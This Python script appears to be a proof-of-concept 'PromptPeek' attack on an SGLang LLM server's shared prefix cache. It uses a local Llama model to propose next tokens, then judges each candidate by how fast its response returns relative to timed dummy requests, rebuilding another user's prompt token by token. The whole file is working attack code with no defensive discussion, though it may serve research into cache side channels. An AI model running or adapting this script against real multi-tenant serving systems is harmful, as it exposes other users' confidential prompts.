import asyncio
import json
import logging
import sys
from typing import List, Tuple

import httpx
import requests
import torch
from transformers import AutoTokenizer
from transformers.models import LlamaForCausalLM

MODEL_NAME_OR_PATH = "/home/marcorentap/.cache/huggingface/hub/models--meta-llama--Llama-3.2-1B-Instruct/snapshots/9213176726f574b556790deb65791e0c5aa438b6"
SGLANG_SERVER = "http://localhost:30000"
CANDIDATES_SIZE = 8
DUMMIES_SIZE = 8
MAX_TOKENS = 128
TEMPERATURE = 0

# How many post dummies until candidates are considered wrong
POST_DUMMY_THRESHOLD = 4

model = LlamaForCausalLM.from_pretrained(MODEL_NAME_OR_PATH)
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME_OR_PATH)
client = httpx.AsyncClient(timeout=120)


def gen_next_tokens(prefix: List[int]) -> Tuple[List[int], List[int]]:
    input_ids = torch.tensor([prefix])  # batch of size 1
    attention_mask = torch.ones_like(input_ids)

    outputs = model(input_ids=input_ids, attention_mask=attention_mask)
    logits = outputs.logits

    last_token_logits = logits[0, -1, :]

    topk = torch.topk(last_token_logits, k=CANDIDATES_SIZE)
    top_indices = topk.indices
    candidates = top_indices.tolist()

    bottomk = torch.topk(last_token_logits, k=DUMMIES_SIZE, largest=False)
    bottom_indices = bottomk.indices
    dummies = bottom_indices.tolist()

    # Top-K, Bottom-K tokens
    return (candidates, dummies)


async def send_request(toks: List[int], req_id: str):
    delay = 0
    return await client.post(
        f"{SGLANG_SERVER}/generate",
        json={
            "input_ids": toks,
            "rid": req_id,
            "sampling_params": {
                "temperature": TEMPERATURE,
                "max_new_tokens": MAX_TOKENS,
            },
        },
        headers={
            "PromptPeek-Request-Id": req_id,
            "PromptPeek-Delay": str(delay),
        },
    )


async def peek_one(prefix: List[int]) -> List[List[int]]:
    cand_toks, dummy_toks = gen_next_tokens(prefix)
    candidates = [prefix + [tok, dummy_toks[0]] for tok in cand_toks]
    dummies = [prefix + [dummy_toks[0], dummy_toks[0]] for _ in dummy_toks]

    tasks = []
    for i, pre_dummy in enumerate(dummies):
        tasks.append(asyncio.create_task(send_request(pre_dummy, f"pre_dummy_{i}")))
    await asyncio.sleep(0.2)

    for i, cand in enumerate(candidates):
        tasks.append(asyncio.create_task(send_request(cand, f"candidate_{i}")))
    await asyncio.sleep(0.2)

    for i, post_dummy in enumerate(dummies):
        tasks.append(asyncio.create_task(send_request(post_dummy, f"post_dummy_{i}")))
    await asyncio.sleep(0.2)

    response_order = []
    for task in asyncio.as_completed(tasks):
        res = await task
        body = res.json()

        e2e_latency = body["meta_info"]["e2e_latency"]

        req_id = res.request.headers["PromptPeek-Request-Id"]
        # delay = res.request.headers["PromptPeek-Delay"]

        response_order.append({"id": req_id, "e2e_latency": e2e_latency})

    n_post_dummies = 0
    next_prefixes = []
    for res in response_order:
        if res["id"].startswith("post_dummy"):
            n_post_dummies += 1
        if n_post_dummies >= POST_DUMMY_THRESHOLD:
            break
        if res["id"].startswith("candidate"):
            idx = int(res["id"].split("_")[-1])
            next_prefix = candidates[idx][: len(prefix) + 1]
            next_prefixes.append(next_prefix)

    return next_prefixes


async def main():
    victim_input = input("Enter victim's prompt: \n")
    known_prefix = input("Enter known prefix: \n")

    # Flush Cache
    requests.post(SGLANG_SERVER + "/flush_cache")

    # Victim
    victim_toks = tokenizer.encode(victim_input)
    await send_request(victim_toks, "victim_0")

    prefixes = [tokenizer.encode(known_prefix)]
    while len(prefixes) > 0:
        prefix = prefixes.pop(0)
        if len(prefix) > len(victim_toks):
            break

        print(tokenizer.decode(prefix))
        next_prefixes = await peek_one(prefix)
        prefixes.extend(next_prefixes)


if __name__ == "__main__":
    asyncio.run(main())
